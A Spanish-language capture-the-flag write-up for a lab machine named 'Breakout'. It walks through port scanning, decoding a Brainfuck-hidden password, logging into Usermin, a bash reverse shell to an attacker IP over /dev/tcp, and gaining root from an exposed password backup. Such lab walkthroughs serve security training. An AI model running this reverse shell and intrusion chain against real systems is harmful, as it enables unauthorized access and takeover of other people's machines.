---
layout: post
title: "Breakout"
---

## Enumeración

Comenzamos con un escaneo de puertos utilizando `nmap`:

```bash
sudo nmap -p- --open -sSCV --min-rate 5000 10.0.2.7 -n -Pn
```

El escaneo revela varios puertos abiertos:

- 80: Apache 2.4.51 (Debian)
- 139, 445: Samba smbd 4.6.2
- 10000, 20000: MiniServ Webmin httpd

---

Al acceder al puerto 80, vemos la página por defecto de Apache:


Revisamos el código fuente de la página y encontramos un mensaje escondido:

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
++++++++++[>+>+++>+++++++++++>++++++++<<<<-]>>+++++++++++++++++.+++++.>>++++++++++++++++++.----.<+++++++++.-------------.>>-------------.>-------------.+++.<<+.>-.--------.+++++++++++++++.<<++++++++.++++++.
-->

El mensaje parece estar cifrado en Brainfuck, lo que confirmamos en la herramienta dcode.fr:


El resultado descifrado es:

css
Copiar código
.2uqPEfj3DcP`a-3
Enumeración Samba
Usamos enum4linux para obtener más información:

bash
Copiar código
enum4linux 10.0.2.7

Se detecta un usuario interesante:

cyber


Acceso Webmin (Usermin)
Visitamos el servicio corriendo en el puerto 20000, el cual es Usermin:


Probamos las credenciales encontradas:

Usuario: cyber

Contraseña: .2uqPEfj3DcP\a-3`

¡Accedemos con éxito!


Reverse Shell
Dentro de Usermin, encontramos una terminal web. Usamos sh para lanzar una reverse shell:

bash
Copiar código
sh -i >& /dev/tcp/10.0.2.15/4444 0>&1

En nuestra máquina atacante:

bash
Copiar código
sudo nc -lvnp 4444

Se establece la reverse shell como el usuario cyber:


Escalada de privilegios
Inspeccionando el sistema, encontramos un archivo sensible en /var/backups/:

bash
Copiar código
cd /var/backups
ls -la

Copiamos el archivo .old_pass.bak a nuestra carpeta y lo comprimimos en un .tar:

bash
Copiar código
tar -cvf password.tar /var/backups/.old_pass.bak

Extraemos el contenido y obtenemos acceso total al archivo como el usuario actual:

bash
Copiar código
tar -xf password.tar

Leemos el archivo:

bash
Copiar código
cat .old_pass.bak
Credenciales encontradas:

Contraseña root: Ts&4&YurgtRX(=~h

Intentamos cambiar a root:

bash
Copiar código
su root

¡Y lo logramos! Somos root.

Conclusión
Accedimos mediante una credencial oculta en la fuente HTML cifrada en Brainfuck.

Escalamos privilegios mediante acceso a backups mal protegidos.

Obtenemos root con una contraseña antigua almacenada sin protección.

¡Máquina completada con éxito!
